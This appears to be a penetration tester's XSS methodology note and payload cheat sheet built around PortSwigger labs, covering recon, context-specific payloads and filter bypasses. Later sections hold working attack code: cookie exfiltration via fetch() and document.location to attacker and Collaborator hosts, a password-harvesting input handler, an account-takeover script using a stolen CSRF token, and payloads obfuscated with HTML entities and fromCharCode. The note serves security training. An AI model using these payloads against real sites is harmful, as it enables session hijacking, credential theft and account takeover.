![[XSS.png]]
# Recon

To identify reflections of user input, submit a unique random alphanumeric string into every parameter in each request, one at a time, and identify which parameters the app is reflecting back. Also, submit the random string on any headers that the app seems to be processing.

While testing the reflection, review the source code to identify all the locations where the unique string is reflected. Each occurrence needs to be tested separately. Depending on the context of where the string is being reflected, determine how the string needs to be modified in order to cause execution of a script.

Use a PoC alert box to confirm that the script is executing in your browser.

To identify stored XSS, submit a unique random string in every input field on the app and review all the app's functionality to see if there are any more instances where the string is displayed back to the browser. User-controllable data entered in 1 location can end up being reflected in many other arbitrary locations and each appearance may have different protective filters.

Identify if there is any input validation or encoding on the reflected data and determine how it needs to be modified to cause an execution of code. If you have access to 2 accounts, check if the injected data from the normal user appears in any of the functionality that an admin user can see.

Make sure to complete the entire process when testing inputs that require multiple requests before they are stored, such as registering a user, placing an order, etc..

Additionally, test file upload functionalities for stored XSS. For reflected XSS, it is straight forward to identify which parameters are vulnerable, as each parameter is tested individually, and the response is analysed for any appearances of the input.

For stored XSS, if the same data is included in every input field, then it may be difficult to determine which parameter is the one responsible for the appearance of the data on the app. To avoid this, submit different test strings for each parameter when probing for Stored XSS - test123comment, test123username, etc...

For DOM-based XSS, use the browser to test, as it will cause all the client-side scripts to execute. After mapping out the app, review all JavaScript client-side scripts for any "sources" in which a user can potentially control such as the following [list](https://portswigger.net/web-security/dom-based#common-sources).

Review the code to identify what is being done with the user-controllable data, and if it can be used to cause JavaScript execution. Identify if the data is being passed to dangerous "sinks" presented [here](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities). 

Finally, Burp Suite also has built-in tools to test for DOM XSS such as [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader).

>[!info]
>DOM XSS can be combined with either a Reflected/Stored XSS. Any client-side protections can be bypassed using Burp Suite before the data is passed back to the vulnerable client-side script.

# Cheat Sheet

As a quick note, you can use eval() and String.fromCharCode() to encode a full payload (CyberChef --> To Decimal --> Delimiter set to "comma" --> Copy/Paste):

```javascript
eval(String.fromCharCode(INSERT_PAYLOAD));
```

You can also use the following payload:

```javascript
window['document']['location'] = "https://j3y25yhg.oastify.com/?test=" + document.domain + "test123"
```
# Initial Probing

Submit a test string to all input fields one at a time and identify the context in which the data is being returned in the responses. For stored XSS, you can add the parameter name to the payload. The below test strings will verify how the app responds to angle brackets, parentheses, quotation marks, and single quotes:

```javascript
<>"'/\`
```

```javascript
Test123parameterName
```

```html
<<u>Test123</u>
```

```html
<script>alert("Test123)</script>
```

```html
<script>alert('Test123')</script>
```

Depending on the context, the following payloads can be used to break out of the context and potentially execute XSS.
# XSS Between HTML tags and DOM XSS

If injected input is not being validated or encoded, you can simply use the standard XSS payloads below:

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

The app may be encoding the injected tags, but not in a recursive way. The \<test> tag may be properly encoded and rendered as data, but the rest of the payload will be executed as code.

```html
<test> <img src=x onerror=alert(1)>
```

If the app is blocking some common tags, you can inject custom ones. For example, you can use Intruder to fuzz and check which tags and event handlers are allowed:

- Example: \<FUZZ>, \<body FUZZ="test>

```html
<input2 onmouseover=alert(1)>TEST</input2>
<body onresize="print()">
```

You can also submit a payload to the victim using the exploit server by encoding the special characters:

```html
<script>
      location = 'https://your-lab-id.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
```

The first quotation mark that is in the payload and the angle brackets must be encoded:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

IF the app allows you to render SVG tags, then the following payload can be attempted:

```html
<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
```

If reflected XSS is present and event handlers and href attributes are blocked, try:

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

IF user-controllable source is passed to the .innerHTML() sink, then you can use an image tag to execute JavaScript. The .innerHTML() property will not execute script tags:

```html
<img src=x onerror=alert(1)>
```

If the app is using AngularJS, try injecting the following payload to the input fields and see if the expression is getting processed:

- {{2+2}} = 4

```javascript
{{ this.constructor.constructor('alert("foo")')() }}
```

```javascript
{{$on.constructor('alert(1)')()}}
```

For DOM XSS jQuery selector sink - hashchange event, the vulnerable code is as follows:

```javascript
<script>
   $(window).on('hashchange', function(){
      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
         if (post) post.get(0).scrollIntoView();
   });
</script>
```

IIn this example, the "src" attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire:

```html
<iframe src="https://VULNERABLE-APPLICATION/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
# XSS in HTML Tag Attributes

When the injected input is reflected within an HTML attribute, you need to close out the existing attribute/tag and introduce a new tag to execute JavaScript:

```html
"><script>alert(1)</script>
```

IF angle brackets are encoded but data is reflected in the attribute, try the following. It will break out of the current attribute and introduce a new one that can execute JavaScript. The last quotation mark is needed to ensure the syntax of the tag is correct:

```javascript
Test123" autofocus onfocus=alert(1) x="
```

If input is within an href attribute, the JavaScript pseudo protocol can be used:

```javascript
javascript:alert(1)
```

If input is reflected within a canonical link tag such as:

```html
<link rel="canonical" href='https://some-sitecom/user-input' />
```

Then try:

```javascript
' accesskey='x' onclick='alert(1)
```
# XSS Into JavaScript

IF there is a JS string with single quotes and backslashes escaped, attempt the following which closes the existing script tag and introduces a new tag that can execute JS code:

```html
</script><img src=x onerror=alert(1)>
```

If angle brackets are encoded, the following will terminate the existing string and close the statement, then comment out the rest of line. Since the input is within <\script> tags, the payload gets executed as JS:

```javascript
'; alert(1) //
```

If angle brackets and double quotes are encoded and single quotes are escaped, attempt the following. The escape character itself may not be escaped, so when you supply it in the payload, the app ends up escaping the escape character instead of the single quote. Since the input is already within \<script> tags, the alert() will execute.

The payload may be:

```javascript
\'; alert(1)//
```

And the end result would be:

```javascript
\\';alert(1)//
```

If there is XSS on an onclick event with angle brackets, double quotes and single/backslashes escaped, attempt the following. You may be able to bypass server-side validation by submitting HTML entities. The browser will decode the HTML entities before the JavaScript is executed, which will break out of the context and execute the JavaScript.

As an example:

```html
<a onclick="var x=z; x.y('https://user-input');" >
```

And some identification payloads:

```javascript
&apos; ) ; alert(1) ;//
&apos; -alert(1)- &apos;
```

In this scenario, the app may be encoding tags/quotations and escaping single quotes and backslashes. You can bypass this by HTML encoding the payload. For example, the original payload:

```javascript
') ; document.location = 'https://y51tyh5h.oastify.com/?x=' + document.domain ; //
```

And an HTML encoded payload:

```html
&apos;) ; &#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x74;&#x6a;&#x67;&#x38;&#x75;&#x7a;&#x30;&#x71;&#x6f;&#x6a;&#x63;&#x38;&#x2e;&#x6f;&#x61;&#x73;&#x74;&#x69;&#x66;&#x79;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x3f;&#x78;&#x3d;&#x27;&#x20;&#x2b;&#x20;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e; ; //
```

When the injected input is being reflected inside of backticks, you can execute expressions using the ${data} format. An example:

```html
<script>var message=`user-input`</script>
```

A payload may be:

```javascript
${alert(1)}
```
# XSS to Exploit Users

As an example, you can inject the following to steal a user's session cookie. Here, the attacker-server could be Burp Collaborator:

```javascript
<script>
fetch('https://ATTACKER-SERVER', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

You can inject the fetch function in any event handler that executes JavaScript, including:

```html
<svg onload="fetch('https://277ebucws3h.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});"></svg>
```

```html
<style>@keyframes x{}</style>
<svg style="animation-name:x" onanimationend="fetch('https://yoqy8pwqkf.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.domain
});"></svg>
```

Following on, you can inject the following to steal a user's credentials:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER-SERVER',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

And the following could be used to force a user into changing their email address to test@test.com which can be combined with a "Forgot password" functionality to take over an account:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
# More Exploitation Payloads and Examples

Some more examples can be seen below. For example, the following code is vulnerable as the payload is included into an eval() function. The response type where the payload is reflected is in JSON body:

```javascript
if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
}
```

And the payload is below - the app is escaping the quotations but not the backslash character:

```javascript
\"-alert(1)}//
```

An arithmetic operator is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:

```javascript
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

Using the above context, the following payload can be used to exfiltrate information. The random query parameter 'x' was included so that way the document cookie will correctly be included in the request sent to Burp Collaborator. This is similiar to a lab, where the exploit server was used to exfiltrate data:

```javascript
\" - (document.location = 'https://xxxx.oastify.com/x?=' + document.cookie)}//
```

Another request is the following which submits a request with the user's cookie to Collaborator:

```javascript
<script> window['document']['location'] = "https://xqr9xaoylma.oastify.com/?test1=" + document.cookie + "test1"; </script>
```

Additionally, if the context is within an HTML attribute and angle brackets are encoded, you can do the following. Note that encoding the payload actually made it not work so it is good to try many things. The closing quotation is not included since one will be there with the current context:

```javascript
test123" onmouseover="document.location = 'https://xxx.oastify.com/?x=' + document.domain
```

If the app is encoding angle brackets/double quotes and escaping single quotes, the below payloads can help bypass restrictions. For example, go to CyberChef, select "To Decimal" and set the delimiter to "Comma". Paste the payload results within the "string.fromCharCode()" function.

For example, the original payload may be:

```javascript
\'; document.location =  "https://3imrz0nwbl.oastify.com/?x=" + document.domain + "END" ; //
```

And the final payload may be:

```javascript
\'; eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,99,118,98,48,115,54,111,118,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)) ; //
```

This payload executes the document.domain:

```javascript
\'; var x = String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110) ; alert(eval(x)) ; //
```







